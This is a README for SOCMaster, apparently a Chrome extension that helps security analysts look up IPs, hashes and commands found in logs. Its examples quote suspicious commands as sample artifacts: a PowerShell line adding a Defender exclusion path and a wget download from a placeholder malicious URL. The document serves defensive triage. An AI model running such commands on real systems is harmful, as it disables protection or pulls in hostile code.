# Identify IPs, domains, hashes, operating system commands with one click without leaving your browser tab.

SOCMaster can allow security analysts, system administrators, or incident responders to quickly look up artifacts on their SIEM or any web application containing log files. This tool may reduce triage and investigation times as well as headaches from manually searching IP addresses or operating system commands that require multiple tabs to keep track of.

## How to use

1. Highlight an artifact and Rightclick
2. Select "SOCMaster"
3. Click one of the options available
4. Menu will appear on lower right side containing information about the artifacts

## Configuration

To query IP, Domain, and Hash using vendor API keys, the API key is required. Follow the steps:

1. Click Extensions icon in Google Chrome's upper right menu
2. Click "SOCMaster" > Settings
3. On the settings page, on the upper right corner click "Add API key"
4. On intel source selection, select API key vendor
5. Paste Vendor API key on the field
6. Click save
7. API key now added, IP/Domain/Hash scan using vendor API keys can now be used

## Example use case:

* Suspicious PowerShell logs show: Set-MpPreference -ExclusionPath "C:\users\public\documents\sucmra"  

A user can highlight and select the "Find command information" option and will be able to view the syntax and parameters of the command.  

* Suspicious IP address from the firewall logs: 1.2.3.4  
  
A user can highlight and select the "IP scan using vendor API keys" option and will be able to view IP reputation and data from vendors.  

* Suspicious linux command show wget http://malicious_url -O  
  
A user can highlight and select the "Find command information" option and will be able to view the syntax and parameters of the command.  

* A system administrator forgot the parameters for the creating a new AD user using New-ADUser cmdlet  

The administrator can highlight and select the "Find command information" option and will be able to view the syntax and parameters of the command.  

# Credits

This chrome extension uses following websites as reference data:

lolbas-project.github.io
gtfobins.github.io
ss64.com
man7.org
linux.die.net
file.net
learn.microsoft.com
google.com
renenyffenegger.ch
strontic.github.io

Michael Hingpit for help with UI  
